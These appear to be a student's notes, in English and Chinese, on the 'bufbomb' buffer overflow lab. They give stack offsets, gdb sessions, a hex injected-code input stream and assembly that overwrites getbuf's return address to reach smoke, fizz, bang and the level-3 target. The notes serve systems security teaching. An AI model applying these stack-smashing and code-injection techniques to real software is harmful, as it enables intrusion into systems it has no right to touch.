## Level 0
https://www.cnblogs.com/chkkch/archive/2011/06/09/2076773.html
https://github.com/HeLiangHIT/Hardware_Software_Interface/blob/f223721d39c88ffb30a109922fbb7db761e6a3ee/README.md
To understand the bytes we need to overwrite, there are 0x30=48 bytes buf[] plus 8 bytes(one block) of rbp pushed, total 56 bytes. Then the ret addr of getbuf!
replace the getbuf() ret addr 0x0000000000400ef3 with addr of smoke()

## Level 1
Check slide sp20 L12 procedureII, above the ret addr the getbuf(now is fizz) expected to be the args of fizz().
replace getbuf ret addr to 401070, then args are above $rsp, cookie is -8+16 above.
0000000000401070 <fizz>:
  401070:	48 83 ec 08          	sub    $0x8,%rsp
  401074:	c7 05 32 12 20 00 01 	movl   $0x1,0x201232(%rip)        # 6022b0 <check_level>
  40107b:	00 00 00 
  40107e:	48 8b 74 24 10       	mov    0x10(%rsp),%rsi
  401083:	48 3b 35 96 12 20 00 	cmp    0x201296(%rip),%rsi        # 602320 <cookie>
Bytes: 48+8(%rbp)+8(ret addr)+8(empty)+8(cookie)

OR method 2 https://zhuanlan.zhihu.com/p/339802171
我们发现rsp的地址为0x5561dc78 是不是有点想法可以开始写了。

我们可以让执行完getbuf之后回到rsp的这里。然后把我们要执行的三行汇编代码执行。就可以成功执行touch2了。这样我们的输入流就如下图。

48 c7 c7 fa 97 b9 59 68 <-读入我们要执行的汇编语句
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 <-返回地址为rsp 


## Level 2
Cookie: 0x57c16f3c39d3260f

Breakpoint 1, getbuf () at bufbomb.c:136
136	  unsigned long long val = (unsigned long long)Gets(buf);
(gdb) next
137	  variable_length = alloca((val % 40) < 36 ? 36 : val % 40);
(gdb) info r $rsp
rsp            0x7fffffffbcd0	0x7fffffffbcd0

Bytes: 26(code)+22+8(%rbp)+8(ret addr, replaced with addr of buf[]), so that ret to the top of buf $rsp and execute cmds in bang_yukun.d

## Level 3
getbuf()返回的根本就不是cookie，没错，关键时候还是自己手动返回吧

we also need to restore $rbp value back, so we break at 132 and check what is the value of $rbp

Breakpoint 1, 0x0000000000400da1 in getbuf () at bufbomb.c:132
132	{
(gdb) info frame
Stack level 0, frame at 0x7fffffffbd10:
 rip = 0x400da1 in getbuf (bufbomb.c:132); saved rip = 0x400ef3
 called by frame at 0x7fffffffbd40
 source language c.
 Arglist at 0x7fffffffbd00, args: 
 Locals at 0x7fffffffbd00, Previous frame's sp is 0x7fffffffbd10
 Saved registers:
  rbp at 0x7fffffffbd00, rip at 0x7fffffffbd08
(gdb) print /x $rbp
$1 = 0x7fffffffbd30
(gdb) disas
Dump of assembler code for function getbuf:
   0x0000000000400da0 <+0>:	push   %rbp
=> 0x0000000000400da1 <+1>:	mov    %rsp,%rbp
(gdb) info r
rax            0x0	0
rbx            0xb9382ad	194216621
rcx            0xdeadbeef	3735928559
rdx            0x0	0
rsi            0x7274732065707954	8247343400600238420
rdi            0x603280	6304384
rbp            0x7fffffffbd30	0x7fffffffbd30
rsp            0x7fffffffbd00	0x7fffffffbd00
(gdb) x /5gx $rsp
0x7fffffffbd00:	0x00007fffffffbd30	0x0000000000400ef3

So
movabs $0x57c16f3c39d3260f,%rax
movabs $0x7fffffffbd30, %rbp
pushq  $0x400ef3
retq